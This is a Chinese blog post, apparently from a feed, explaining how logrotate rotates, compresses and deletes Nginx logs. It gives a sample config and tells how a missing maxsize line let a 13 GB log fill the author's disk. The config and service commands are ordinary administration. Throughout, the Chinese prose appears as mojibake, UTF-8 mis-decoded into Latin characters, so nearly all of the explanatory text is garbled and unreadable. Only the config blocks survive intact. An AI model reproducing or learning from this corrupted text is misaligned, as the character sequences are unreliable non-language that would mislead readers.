<p>é»˜è®¤æƒ…å†µä¸‹ä¸€ä¸ªæœåŠ¡çš„åŒä¸€ä¸ªæ—¥å¿—æµï¼ˆå¦‚ Nginx é»˜è®¤å°±æœ‰ error.log access.log ä¸¤ä¸ªæ—¥å¿—æµï¼‰æ˜¯è¾“å‡ºåˆ°åŒä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­çš„ï¼Œä¹Ÿå°±æ˜¯è¯´éšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¿™ä¸€æ—¥å¿—æ–‡ä»¶ä¸­åŒ…å«çš„æ—¥å¿—çš„å¤©æ•°ä¹Ÿä¼šè¶Šæ¥è¶Šå¤šï¼Œè¿™å°±ç»™æŸ¥çœ‹æŸä¸€ç‰¹å®šæ—¶é—´æ®µçš„æ—¥å¿—å¸¦æ¥äº†éº»çƒ¦ï¼ˆè¯•æƒ³ä¸€ä¸‹åœ¨ä¸€ä¸ªå®¹é‡10Gï¼ŒåŒ…å«äº†ä¸€æ•´å¹´æ•°æ®çš„æ—¥å¿—æ–‡ä»¶ä¸­æŸ¥æ‰¾5æœˆä»½çš„æ—¥å¿—ä¿¡æ¯ï¼Œè€Œä¸”è¿˜æ²¡æœ‰æ—¥å¿—è¾…åŠ©å·¥å…·çš„å¸®åŠ©ï¼Œæ˜¯ä¸€ä»¶å¤šä¹ˆç—›è‹¦çš„äº‹æƒ…ï¼‰ã€‚å¹¶ä¸”å¦‚æœæ—¥å¿—æ–‡ä»¶å ç”¨äº†è¿‡å¤§çš„å­˜å‚¨ç©ºé—´ï¼Œé‚£ä¹ˆäººä»¬é€šå¸¸ä¼šä¼˜å…ˆåˆ é™¤æœ€è€çš„æ—¥å¿—ï¼Œä¿ç•™æœ€è¿‘ä¸€æ®µæ—¶é—´çš„æ—¥å¿—ã€‚å¦‚æœæ‰€æœ‰æ—¥å¿—ä¿¡æ¯éƒ½å‚¨å­˜åœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆæƒ³è¦åªåˆ é™¤éƒ¨åˆ†æ•°æ®ä¹Ÿä¸æ˜¯ä¸€ä»¶è½»æ¾çš„æ´»ã€‚</p>
<p>å†è€…ï¼Œæ—¥å¿—æ•°æ®é€šå¸¸éƒ½æ˜¯çº¯æ–‡æœ¬æ•°æ®ï¼Œå¹¶ä¸”å†…å®¹é‡å¤åº¦éå¸¸ä¹‹é«˜ï¼Œå¦‚æœèƒ½å¤Ÿå°†å…¶å‹ç¼©å­˜å‚¨ï¼Œé‚£ä¹ˆä¼šå¤§å¤§å‡å°ä½“ç§¯ã€‚ç„¶è€Œæ—¥å¿—ç³»ç»Ÿæ˜¯æ²¡æœ‰åŠæ³•å°†æ•°æ®è¿½åŠ åˆ°ä¸€ä¸ªå‹ç¼©è¿‡çš„æ—¥å¿—æ–‡ä»¶ä¸­å»çš„ã€‚å¦‚æœè¦å‹ç¼©æ—¥å¿—ï¼Œé‚£ä¹ˆåŠ¿å¿…éœ€è¦å°†æ—¥å¿—æ•°æ®åˆ’åˆ†æˆæ–°ã€æ—§ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­æ—§æ—¥å¿—å‹ç¼©åå•ç‹¬å­˜æ”¾ï¼Œæ–°æ—¥å¿—å³æ˜¯å½“å‰ç³»ç»Ÿæ´»åŠ¨çš„æ—¥å¿—æ–‡ä»¶ï¼Œä»ç„¶æ˜¯çº¯æ–‡æœ¬å½¢å¼ã€‚</p>
<p>ç»¼ä¸Šæ‰€è¿°ï¼Œä¸€ä¸ªå¥½çš„æ—¥å¿—ç³»ç»Ÿè‡³å°‘éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªéœ€æ±‚ï¼š</p>
<ul>
<li>èƒ½å¤Ÿå°†æ—¥å¿—æŒ‰ä¸€å®šè§„å¾‹æ‹†åˆ†æˆå¤šä¸ªæ–‡ä»¶</li>
<li>èƒ½å¤Ÿå°†éæ´»åŠ¨çš„æ—¥å¿—å‹ç¼©</li>
<li>èƒ½å¤Ÿæ§åˆ¶æ—¥å¿—æ–‡ä»¶ä½“ç§¯å’Œæ•°é‡ï¼Œå½“æ¡ä»¶æ»¡è¶³æ—¶è‡ªåŠ¨åˆ é™¤æ—§æ—¥å¿—ä»¥é‡Šæ”¾ç©ºé—´</li>
<li>æ—¥å¿—æ–‡ä»¶åæ»¡è¶³ä¸€å®šè§„å¾‹ä¾¿äºæ’åºå’Œç­›é€‰</li>
</ul>
<p>ä»¥ä¸Šçš„éœ€æ±‚ï¼Œé€šå¸¸ç§°ä¸º<strong>æ—¥å¿—æ»šåŠ¨</strong><del>ï¼ˆå¿…è€ƒï¼‰</del>ã€‚</p>
<h1>æ—¥å¿—æ»šåŠ¨</h1>
<p>é“ç†æˆ‘éƒ½æ‡‚ï¼Œä½†æ˜¯Linuxçš„æ—¥å¿—ç³»ç»Ÿæ²¡æœ‰æä¾›è¿™äº›åŠŸèƒ½ï¼Œæ€»ä¸èƒ½æ¯å¤©æ‰‹åŠ¨é‡å‘½åã€å‹ç¼©ã€æ¸…ç©ºã€åˆ é™¤æ—¥å¿—å§ï¼Ÿ</p>
<p><del>å¤©ç©ºä¸€å£°å·¨å“ï¼Œè‹±é›„é—ªäº®ç™»åœºï¼</del>è¿™æ—¶å€™ä¸€ä¸ªå«åš <strong>logrotate</strong> çš„ç¨‹åºå°±æ´¾ä¸Šäº†ç”¨å¤„ã€‚</p>
<p>æ ¹æ®ä½¿ç”¨çš„ç³»ç»Ÿä¸åŒï¼Œlogrotateçš„å®‰è£…æ–¹å¼ä¹Ÿä¸å°½ç›¸åŒï¼Œæœ‰äº›ç³»ç»Ÿæ›´æ˜¯è‡ªå¸¦äº† logrotate å¹¶ä¸”å¸¦æœ‰å¾ˆå¤šé»˜è®¤çš„é…ç½®ï¼ˆæ¯”å¦‚æˆ‘æ‰€ä½¿ç”¨çš„ Ubuntu Serverï¼‰ã€‚</p>
<p>ä½ å¯ä»¥åœ¨è‡ªå·±çš„ç³»ç»Ÿä¸ŠæŸ¥çœ‹ä¸€ä¸‹ /var/log/ ç›®å½•ä¸‹çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¦‚æœè§åˆ°äº†ç±»ä¼¼â€œæœåŠ¡å.log.0â€ã€â€œæœåŠ¡å.log.1â€ç­‰ä¸€å¤§å †å…·æœ‰ç›¸åŒæœåŠ¡åç§°ä½†æ˜¯å¸¦æœ‰åç¼€åºå·çš„æ—¥å¿—æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥99%è‚¯å®šè¿™ä¸ªç³»ç»Ÿå·²ç»å®‰è£…äº† logrotate å¹¶ä¸”èƒ½å¤Ÿå·¥ä½œã€‚</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png"><img loading="lazy" class="aligncenter size-full wp-image-492" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png" alt="logrotate" width="663" height="579" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logs.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logs-300x262.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>å¦‚æœä½ çš„ç³»ç»Ÿæ²¡æœ‰å¸¦logrotateï¼Œåˆ«æ‹…å¿ƒï¼Œç™¾åº¦ä¸€ä¸‹å°±èƒ½è£…ä¸Šå•¦ï¼è€Œä¸”é…ç½®å·¨ç®€å•ï¼</p>
<p>åœ¨ /etc/logrotate.d/ ç›®å½•ä¸‹ï¼ˆä¸åŒç³»ç»Ÿå¯èƒ½æœ‰æ‰€åŒºåˆ«ï¼‰é€šå¸¸ä¼šæœ‰å¾ˆå¤šé…ç½®æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶çš„åå­—é€šå¸¸å¯¹åº”äº†è¯¥æ–‡ä»¶æ‰€ç®¡è¾–çš„æœåŠ¡ï¼ˆæ–‡ä»¶åä»…ä»…æ˜¯ä¾¿äºç®¡ç†ï¼Œå’Œå®é™…å†…å®¹æ²¡æœ‰å¿…ç„¶å…³è”ï¼‰ã€‚</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png"><img loading="lazy" class="aligncenter size-full wp-image-494" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png" alt="logrotate config" width="663" height="435" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg-300x197.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>è€Œè¿™äº›é…ç½®æ–‡ä»¶çš„æ ¼å¼éå¸¸çš„ç®€è¦ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚é€šå¸¸ç¬¬ä¸€è¡Œä»¥ç›®æ ‡æ—¥å¿—æ–‡ä»¶è·¯å¾„èµ·å¤´ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ï¼Œè€Œåé¢çš„èŠ±æ‹¬å·å†…éƒ¨åˆ™æ˜¯éœ€è¦åº”ç”¨äºè¯¥æ—¥å¿—æ–‡ä»¶çš„æ»šåŠ¨è§„åˆ™ã€‚</p>
<p>å…¶ä¸­å‡ ä¸ªå¸¸ç”¨çš„è§„åˆ™åœ¨è¿™é‡Œç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œé€šå¸¸å°±å¤Ÿç”¨äº†ã€‚æ›´è¯¦ç»†çš„è§„åˆ™å¯ä»¥è‡ªè¡ŒæŸ¥æ‰¾ï¼Œä¸å†èµ˜è¿°ã€‚</p>
<pre class="brush: bash; title: ; notranslate">

/var/log/nginx/*.log {
    daily  # æ»šåŠ¨é¢‘ç‡ï¼Œæ¯å¤©æ»šåŠ¨ä¸€æ¬¡ã€‚å…¶å®ƒå¯é€‰é¡¹ä¸º hourly weekly monthly yearly
    missingok
    rotate 14  # æœ€å¤šä¿ç•™14æ¬¡æ»šåŠ¨ï¼Œè¶…è¿‡åˆ™åˆ é™¤æœ€è€çš„æ—¥å¿—
    maxsize 100M  # é‡è¦ï¼æ´»åŠ¨æ—¥å¿—çš„æœ€å¤§å°ºå¯¸ï¼Œè¶…è¿‡è¯¥å°ºå¯¸åˆ™å¼ºåˆ¶æ»šåŠ¨ä¸€æ¬¡
    compress  # é‡è¦ï¼å‹ç¼©ä¸æ´»åŠ¨çš„æ—¥å¿—ï¼Œé»˜è®¤ä½¿ç”¨gzip
    delaycompress
    notifempty  # å¦‚æœæ—¥å¿—ä¸ºç©ºåˆ™ä¸æ»šåŠ¨
    create 0640 www-data adm
    sharedscripts
    prerotate  # åœ¨æ¯æ¬¡æ»šåŠ¨å‰æ‰§è¡Œçš„è„šæœ¬ï¼Œé€šå¸¸æ˜¯é€šçŸ¥è¯¥æœåŠ¡â€œæˆ‘è¦æ»šåŠ¨æ—¥å¿—å•¦ï¼å…ˆåˆ«ç”Ÿæˆæ–°æ—¥å¿—å’¯ï¼â€
        if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
        run-parts /etc/logrotate.d/httpd-prerotate; \
        fi \
    endscript
    postrotate  # åœ¨æ»šåŠ¨å®Œæˆåæ‰§è¡Œçš„è„šæœ¬ï¼Œé€šå¸¸æ˜¯é€šçŸ¥è¯¥æœåŠ¡â€œæ—¥å¿—æ»šåŠ¨å®Œæˆå•¦ï¼è¯·æŠŠåç»­æ—¥å¿—å†™åˆ°æ–°çš„æ´»åŠ¨æ—¥å¿—æ–‡ä»¶ä¸­å»ï¼â€
        invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1
    endscript
}

</pre>
<p>å¦‚æœå‘ç°æ—¥å¿—æ»šåŠ¨å nginx ä¾æ—§åœ¨å‘ access.log.1 ä¸­å†™å…¥æ—¥å¿—ï¼Œè€Œæ–°åˆ›å»ºçš„ access.log å¤§å°å§‹ç»ˆæ˜¯0ï¼Œé‚£ä¹ˆè¯·å°†ä¸Šæ–‡ä¸­çš„ postrotate ä»£ç æ”¹ä¸ºï¼š</p>
<pre class="brush: bash; title: ; notranslate">

service nginx rotate &gt;/dev/null 2&gt;&amp;1

</pre>
<h1>åˆ’é‡ç‚¹</h1>
<p>åŒå­¦Aï¼šæ…¢ç€ï¼åˆšåˆšä¸æ˜¯è¯´ä½ æœåŠ¡å™¨è·‘çš„ Ubuntu Server é»˜è®¤å¯ç”¨äº† logrotate ä¹ˆï¼Ÿé‚£ä¹ˆä¸ºä»€ä¹ˆä½ çš„ç¡¬ç›˜è¿˜æ˜¯è¢«è¿™äº›æ—¥å¿—æ–‡ä»¶åƒäº†ä¸ªç²¾å…‰å‘¢ï¼ŸæŒ‰è¯´ä¸€å…±å°±ä¿ç•™14ä»½æ—¥å¿—ï¼Œä¹Ÿå°±åªæœ‰14å¤©çš„ä»½ï¼Œè¿˜éƒ½æ˜¯å‹ç¼©è¿‡çš„ï¼Œæ€ä¹ˆä¼šå ç”¨è¿™ä¹ˆå¤šå‘¢ï¼Ÿ</p>
<p>æˆ‘ï¼š<del>è°¢å°”æ›¼M1ï¼Œåï¼</del></p>
<p>é—®é¢˜æ¥äº†ï¼Œè¿™ä¸ª logrotate çš„é»˜è®¤é…ç½®æ–‡ä»¶ï¼Œå°‘äº†Â <em>maxsize 100M</em> è¿™ä¸€è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¯´åœ¨ç¬¬äºŒå¤©çš„æ»šåŠ¨å¼€å§‹å‰ï¼Œæ—¥å¿—å°±å·²ç»å ç”¨äº†è¿‡å¤§çš„ç©ºé—´ï¼Œä»¥è‡³äºå‰©ä½™ç©ºé—´ä¸è¶³ä»¥å‚¨å­˜å¯¹åº”æ—¥å¿—çš„å‹ç¼©æ–‡ä»¶ï¼ˆå› ä¸ºå¾—å…ˆå‹ç¼©å®Œæ‰èƒ½åˆ é™¤åŸå§‹æ–‡ä»¶ï¼Œäºæ˜¯æ•´ä¸ªè¿‡ç¨‹æ‰€éœ€çš„æœ€å¤§ç©ºé—´æ˜¯ <em>åŸå§‹æ–‡ä»¶ä½“ç§¯+å‹ç¼©åçš„ä½“ç§¯</em>ï¼Œæ¯•ç«Ÿä¸å¯èƒ½ä¸€è¾¹å‹ç¼©ä¸€è¾¹åˆ é™¤åŸå§‹æ–‡ä»¶å˜›ï¼‰çš„è¯ï¼Œæ•´ä¸ªæ—¥å¿—æ»šåŠ¨å°±ä¼šå¤±è´¥ã€‚è€Œæˆ‘çš„å®é™…æƒ…å†µå°±æ˜¯ access.log.0 æ–‡ä»¶å ç”¨äº†13Gçš„ç©ºé—´ï¼ˆå‰©ä¸‹çš„13ä¸ªå‹ç¼©åçš„æ—¥å¿—ä¸€å…±æ‰1Gä¸åˆ°ï¼Œå®Œç¾çš„ä½“ç°äº†å‹ç¼©çš„å¥½å¤„ï¼‰ï¼Œå‰©ä½™çš„ç©ºé—´ä¸è¶³ä»¥å¯¹å…¶è¿›è¡Œå‹ç¼©ï¼Œäºæ˜¯æ•´ä¸ªæ—¥å¿—æ»šåŠ¨å½»åº•å¤±æ•ˆäº†ã€‚</p>
<p>å½“ç„¶äº†ï¼Œç†æƒ³çš„æƒ…å†µä¸‹ï¼Œå¦‚æœèƒ½å¤Ÿå°†å…¶è®¾ç½®æˆå…¨éƒ¨æ—¥å¿—åŠ èµ·æ¥çš„ä½“ç§¯è¶…è¿‡ä¸€ä¸ªä¸´ç•Œç‚¹ï¼ˆæ¯”å¦‚æ—¥å¿—ä¸€å…±5Gï¼‰é‚£ä¹ˆå°±è‡ªåŠ¨åˆ é™¤æœ€è€çš„ä¸€ä»½æ—¥å¿—ï¼Œé‚£æ˜¯å å¼å˜€ï¼ç„¶è€Œ logrotate å¹¶æ²¡æœ‰æä¾›è¿™æ ·çš„æ•´ä½“ä½“ç§¯é™åˆ¶çš„åŠŸèƒ½ï¼Œäºæ˜¯åªå¥½ç”¨ä¸€äº›å°æŠ€å·§ã€‚æ³¨æ„è¿™ä¸¤è¡Œï¼š</p>
<pre class="brush: bash; title: ; notranslate">
rotate 14 # æœ€å¤šä¿ç•™14æ¬¡æ»šåŠ¨ï¼Œè¶…è¿‡åˆ™åˆ é™¤æœ€è€çš„æ—¥å¿—
maxsize 100M # é‡è¦ï¼æ´»åŠ¨æ—¥å¿—çš„æœ€å¤§å°ºå¯¸ï¼Œè¶…è¿‡è¯¥å°ºå¯¸åˆ™å¼ºåˆ¶æ»šåŠ¨ä¸€æ¬¡
</pre>
<p>é€šè¿‡é™åˆ¶æ´»åŠ¨æ—¥å¿—çš„ä½“ç§¯ï¼ˆä¹Ÿå°±æ˜¯å°¾å·æ˜¯0æˆ–è€…æ²¡æœ‰åç¼€çš„é‚£ä¸ªæ—¥å¿—æ–‡ä»¶ï¼‰å’Œä¿ç•™æ—¥å¿—æ»šåŠ¨æ•°é‡ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé™åˆ¶æ•´ä½“çš„æ—¥å¿—å¤§å°ï¼Œä¹Ÿå³ä¸è¶…è¿‡ 14 * 100M = 1.4Gã€‚å½“ç„¶è¿™æ ·çš„ç¼ºç‚¹å°±æ˜¯å¦‚æœæŸä¸€å¤©çš„æ—¥å¿—ç‰¹åˆ«å¤šï¼Œé‚£ä¹ˆé‚£ä¸€å¤©çš„æ—¥å¿—ä¼šè¢«æ‹†åˆ†æˆå¤šä¸ªï¼ˆè¯¾å¤–é¢˜ï¼šè‡ªè¡Œç™¾åº¦ï¼Œå°†æ—¥å¿—æ–‡ä»¶åç¼€è®¾ç½®ä¸ºå½“å‰çš„æ—¥æœŸæ—¶é—´ï¼‰ã€‚</p>
<h1>æ€»ç»“</h1>
<p>ä¸é™åˆ¶æ—¥å¿—ä½“ç§¯çœŸæ˜¯å‘å•Šï¼</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/logrotate.html">Logrotate æ—¥å¿—æ»šåŠ¨ è§£å†³æ—¥å¿—å ç”¨ç©ºé—´è¿‡å¤§</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
</feed>